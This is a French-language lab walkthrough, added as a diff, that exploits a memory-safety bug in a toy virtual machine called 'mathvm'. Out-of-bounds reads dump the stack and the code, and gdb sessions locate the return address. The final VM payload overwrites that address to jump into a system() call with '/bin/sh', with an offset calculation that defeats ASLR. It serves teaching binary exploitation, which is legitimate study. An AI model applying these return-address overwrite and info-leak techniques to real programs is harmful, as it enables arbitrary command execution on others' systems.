@@ -1,0 +1,344 @@
+- Dump de la pile (juste apres le tableau data).
+
+# Offset de depart.
+4 1 128
+# Nombre de valeurs a afficher.
+4 2 32
+# Pas pour l'affichage.
+4 3 1
+# Vrai.
+4 4 1
+# Faux.
+4 5 0
+# XX:
+# Si tout est affiche, saut a la fin, vers le label YY.
+9 2 11
+#   Affichage de la valeur stockee en data[data[1]] (128 a 128 + 32), via data[7].
+6 7 1
+7 7
+#   Preparation de l'adresse suivante.
+0 1 3
+#   Decrement de 1 du nombre de valeurs a afficher.
+2 2 3
+#   Saut inconditionnel (data[5] est toujours 0), vers le label XX.
+9 5 5
+# YY:
+
+     @07: 0000000000000000
+     @07: 00000006ffffe300
+     @07: 00007fffffffe300
+     @07: 0000000000401048
+     @07: 00007fffffffe3e8
+     @07: 0000000200000000
+     @07: 74000a3a59592023
+     @07: 69646e6f636e6920
+     @07: 206c656e6e6f6974
+     @07: 5d355b6174616428
+     @07: 756f742074736520
+     @07: 2930207372756f6a
+     @07: 6c2073726576202c
+     @07: 206c6562616c2065
+     @07: 616420000a2e5858
+     @07: 5b6174616420736e
+     @07: 000000000a2e5d37
+     @07: 0000000000000000
+     @07: 0000000000000000
+     @07: 0000000000000000
+     @07: 0000000000000000
+     @07: 0000000000000000
+     @07: 0000000000000004
+     @07: 0000000000000001
+     @07: 0000000000000080
+     @07: 0000000000000004
+     @07: 0000000000000002
+     @07: 0000000000000020
+     @07: 0000000000000004
+     @07: 0000000000000003
+     @07: 0000000000000001
+     @07: 0000000000000004
+
+=> L'adresse en 0x0000000000401048 correspond a l'adresse de retour.
+   elle est a la possition 131.
+
+=> L'adresse en 0x00007fffffffe300 correspond a un sauvegarde de contexte.
+   Il s'agit du contexte du main. L'ecart entre cette valeur et son emplacement
+   en memoire est principalement du aux variables locales du main (tableau d'instructions
+   de 256*3*8 octets = 6144 octets).
+
+=> Le tableau data se situe aux alentours de l'adresse ou 0x00007ffe466ead00 est sauvegarde
+   en memoire moins la taille du tableau (128*8 = 1024 octets).
+   Le tableau debute ENVIRONS a 0x00007fffffffe300 - 1024 - 6144 = 0x7fffffffc700.
+
+=> Par rapport a notre approximation du tableau, le code est a data[-17592185517783] ((0x7fffffffc700-0x0401048)/8)
+
+- Affichage du code (idem avec offset negatif calcule juste precedemment).
+
+# Offset de depart.
+4 1 -17592185517780
+# Nombre de valeurs a afficher.
+4 2 32
+# Pas pour l'affichage.
+4 3 1
+# Vrai.
+4 4 1
+# Faux.
+4 5 0
+# XX:
+# Si tout est afficher, saut a la fin, vers le label YY.
+9 2 11
+#   Affichage de la valeur stockee en data[data[1]] (128 a 128 + 32), dans data[7].
+6 7 1
+7 7
+#   Preparation pour l'adresse suivante.
+0 1 3
+#   Decrement de 1 du nombre de valeurs a afficher.
+2 2 3
+#   Saut inconditionnel (data[5] est toujours 0), vers le label XX.
+9 5 5
+# YY:
+
+     @07: 233cffffe77085b6
+     @07: 8d4800000081840f
+     @07: fc458bffffe7f08d
+     @07: 0148d08948d06348
+     @07: 03e0c148d00148c0
+     @07: 013c8d4810c08348
+     @07: 8bffffe7f08d8d48
+     @07: d08948d06348fc45
+     @07: c148d00148c00148
+     @07: 014808c0834803e0
+     @07: ffffe7f0b58d48c1
+     @07: 8948d06348fc458b
+     @07: 48d00148c00148d0
+     @07: 4806148d4803e0c1
+     @07: 8949ffffe770858d
+     @07: 894800401112bef8
+     @07: 9de800000000b8c7
+     @07: 4801fc4583fffff6
+     @07: 6de8c78948f0458b
+     @07: 810d75c085fffff6
+     @07: 8e0f000000fffc7d
+     @07: 48fc558bffffff31
+     @07: d689ffffe7f0858d
+     @07: fffff7c8e8c78948
+     @07: 90c3c900000000b8
+     @07: 495641ff89415741
+     @07: 41d589495541f689
+     @07: 00200238258d4c54
+     @07: 002002382d8d4855
+     @07: c148db31e5294c53
+     @07: 85e808ec834803fd
+     @07: 1e74ed8548fffff5
+     @07: 0000000000841f0f
+     @07: 8944f6894cea894c
+     @07: c38348dc14ff41ff
+     @07: 8348ea75eb394801
+     @07: 5d415c415d5b08c4
+     @07: 2e6666c35f415e41
+     @07: 0000000000841f0f
+     @07: 08ec83480000c3f3
+     @07: 000000c308c48348
+     @07: 3230254000020001
+     ...
+
+  >> Sauvegarder dans un fichier txt, nomme dump.txt.
+
+(
+  echo 'from struct import *'
+  echo 'm = ""'
+  cut -d' ' -f2 dump.txt | sed "s/^/m = m + pack('<Q', 0x/;s/$/)/"
+  echo 'print m'
+) > sc.py
+python sc.py > binary
+objdump -D -b binary -mi386:x64-32 binary
+
+=> L'attaquant peut 'dumper' tout le code.
+
+- Tentative d'ecrasement de l'adresse de retour avec une valeur 'bidon'.
+
+4 0 131
+6 1 0
+7 1
+4 2 12345678
+5 0 2
+6 1 0
+7 1
+
+=> Erreur de segmentation. C'est bon, on peut continuer.
+
+- Il faudrait faire une boucle sur le code pour 'dumper' le code binaire et le
+  desassembler.
+
+=> A ce moment, l'attaquant connait le code et les positions relatives dans la pile.
+   Il y a ASLR, donc il ne connait pas la position absolue.
+
+=> En croisant avec la sauvegarde du contexte obtenue dans le premier listing, il
+   connait la position absolue.
+
+- Que faire d'interessant ?
+
+=> Il existe une fonction qui effectue un system (c'est print_system !).
+   Confirme avec nm : nm mathvm | grep print_system
+
+- Par contre, cette fonction recupere ses parametres depuis les registres !
+
+=> Elle sauvegarde ses parametres dans la pile pour les remettre dans les registres
+   avant d'invoquer system !
+   Il faut donc sauter en plein milieu de cette fonction.
+
+	print_system:
+		pushq	%rbp
+		movq	%rsp, %rbp
+		subq	$16, %rsp
+		movq	%rdi, -8(%rbp)
+   ici =>	movq	-8(%rbp), %rax
+		movq	%rax, %rdi
+		call	system
+		leave
+		ret
+
+- Preparation des parametres
+
+  echo '/bin/sh' | xxd -g1
+  2f62696e2f73680a
+
+  Le 0x0a doit etre remplace par un 0x00 (fin de chaine).
+  La chaine doit egalement etre stockee dans un long int : il faut inverser les octets
+  a cause de l'endianess :
+
+  0x0068732f6e69622f
+
+  soit 29400045130965551
+
+- Session gdb pour recuperer les positions relatives (triche, mais l'attaquant peut
+  faire sans, cf. commentaires precedents).
+
+     (gdb) disas print_system 
+     Dump of assembler code for function print_system:
+        0x00000000004007f6 <+0>:	push   %rbp
+        0x00000000004007f7 <+1>:	mov    %rsp,%rbp
+        0x00000000004007fa <+4>:	sub    $0x10,%rsp
+        0x00000000004007fe <+8>:	mov    %rdi,-0x8(%rbp)
+        0x0000000000400802 <+12>:	mov    -0x8(%rbp),%rax
+        0x0000000000400806 <+16>:	mov    %rax,%rdi
+        0x0000000000400809 <+19>:	callq  0x400640 <system@plt>
+        0x000000000040080e <+24>:	leaveq 
+        0x000000000040080f <+25>:	retq   
+     End of assembler dump.
+  >> Adresse a utiliser pour ecraser le retour : 0x0000000000400802
+
+     (gdb) b 27
+     Breakpoint 1 at 0x400828: file mathvm.c, line 27.
+     (gdb) run xx
+     Starting program: /home/ealata/public_html/mathvm xx
+     Breakpoint 1, execute (instructions=0x7fffffffcb00, sz=12) at mathvm.c:27
+     27		int ip = 0;
+     (gdb) print &data[0]
+     $1 = (long *) 0x7fffffffc650
+  >> Le tableau de donnees est a l'adresse 0x7fffffffc650.
+
+     (gdb) info frame
+     Stack level 0, frame at 0x7fffffffca70:
+      rip = 0x400828 in execute (mathvm.c:27); saved rip = 0x401048
+      called by frame at 0x7fffffffe320
+      source language c.
+      Arglist at 0x7fffffffca60, args: instructions=0x7fffffffcb00, sz=12
+      Locals at 0x7fffffffca60, Previous frame's sp is 0x7fffffffca70
+      Saved registers:
+       rbp at 0x7fffffffca60, rip at 0x7fffffffca68
+  >> L'adresse de retour est en 0x7fffffffca68.
+  >> Par rapport a data, il s'agit de data[131] ((0x7fffffffca68-0x7fffffffc650)/8).
+
+  >> L'adresse de retour est en 0x7fffffffca68 => on la remplace par 0x0000000000400802.
+     (gdb) set *0x7fffffffca68=0x0000000000400802
+  >> Verification.
+     (gdb) info frame
+     Stack level 0, frame at 0x7fffffffca70:
+      rip = 0x400828 in execute (mathvm.c:27); saved rip = 0x400802
+      called by frame at 0x7fffffffe320
+      source language c.
+      Arglist at 0x7fffffffca60, args: instructions=0x7fffffffcb00, sz=12
+      Locals at 0x7fffffffca60, Previous frame's sp is 0x7fffffffca70
+      Saved registers:
+       rbp at 0x7fffffffca60, rip at 0x7fffffffca68
+     (gdb) x /4x $rbp
+     0x7fffffffca60:	0xffffe310	0x00007fff	0x004010ca	0x00000000
+
+  >> Point d'arret dans print_system.
+     (gdb) b *0x0000000000400802
+     Breakpoint 2 at 0x400802: file mathvm.c, line 22.
+
+  >> Suite de l'execution.
+     (gdb) c
+     Breakpoint 2, print_system (command=0xc00000000 <error: Cannot access memory at address 0xc00000000>)
+         at mathvm.c:22
+     22		system(command);
+
+  >> Affichage du code en cours d'execution.
+     (gdb) disas
+     Dump of assembler code for function print_system:
+        0x00000000004007f6 <+0>:	push   %rbp
+        0x00000000004007f7 <+1>:	mov    %rsp,%rbp
+        0x00000000004007fa <+4>:	sub    $0x10,%rsp
+        0x00000000004007fe <+8>:	mov    %rdi,-0x8(%rbp)
+     => 0x0000000000400802 <+12>:	mov    -0x8(%rbp),%rax
+        0x0000000000400806 <+16>:	mov    %rax,%rdi
+        0x0000000000400809 <+19>:	callq  0x400640 <system@plt>
+        0x000000000040080e <+24>:	leaveq 
+        0x000000000040080f <+25>:	retq 
+  >> A l'adresse -0x8(%rbp), il va falloir mettre l'adresse de la chaine contenant le nom du fichier a executer.
+
+     (gdb) print -0x8+$rbp
+     $3 = (void *) 0x7fffffffe308
+  >> L'adresse de la chaine contenant le nom du fichier a executer doit etre stockee, donc, en 0x7fffffffe308.
+
+  >> Par rapport a data, il s'agit de data[919] ((0x7fffffffe308-0x7fffffffc650)/8).
+
+  >> La chaine peut etre stockee juste avant, en data[918], donc a l'adresse 0x7fffffffe300.
+
+  >> Cette adresse va changer avec ASLR. Il faut une reference et un ecart.
+  >> La reference peut etre la sauvegarde du contexte durant l'execution de execute.
+  >> Le 'info frame' precedent montre que rbp est sauvegarde a l'adresse 0x7fffffffca60
+  >> et que la sauvegarde du contexte est 0x7fffffffe310.
+
+  >> Prendre la sauvegarde du contexte et lui soustraire 0x10 nous amene là où on souhaite mettre notre chaine !
+  >> Cette sauvegarde du contexte est en data[130] ((0x7fffffffca60-0x7fffffffc650)/8).
+
+# Ecrasement de l'adresse de retour avec l'adresse de print_system.
+# 0x0000000000400802 = 4196354.
+4 0 131
+4 1 4196354
+5 0 1
+# Stockage de la chaine '/bin/sh' en data[918].
+4 0 918
+4 1 29400045130965551
+5 0 1
+# Stockage de l'adresse de la chaine '/bin/sh' (i.e., adresse de data[918]) en data[919].
+# 1. Recuperation de la sauvegarde du contexte.
+4 0 130
+6 0 0
+# 2. Soustrait 16 (0x10) a cette adresse.
+4 1 16
+2 0 1
+# 3. Sauvegarde de cette valeur en data[919] => ce doit etre l'adresse de data[918].
+4 1 919
+5 1 0
+
+- Verification de ASLR.
+
+  >> Lancer plusieurs fois avec l'affichage du contexte !
+
+4 0 130
+6 0 0
+7 0
+
+     ealata@quasar:~/public_html$ ./mathvm mathvm-exploit-context 
+     @00: 00007ffd2e236b90
+     ealata@quasar:~/public_html$ ./mathvm mathvm-exploit-context 
+     @00: 00007fffbf4d6ae0
+     ealata@quasar:~/public_html$ ./mathvm mathvm-exploit-context 
+     @00: 00007ffd67861100
+     ealata@quasar:~/public_html$ ./mathvm mathvm-exploit-context 
+     @00: 00007ffd73631530
+     ealata@quasar:~/public_html$ ./mathvm mathvm-exploit-context 
+     @00: 00007ffe1ebbba00
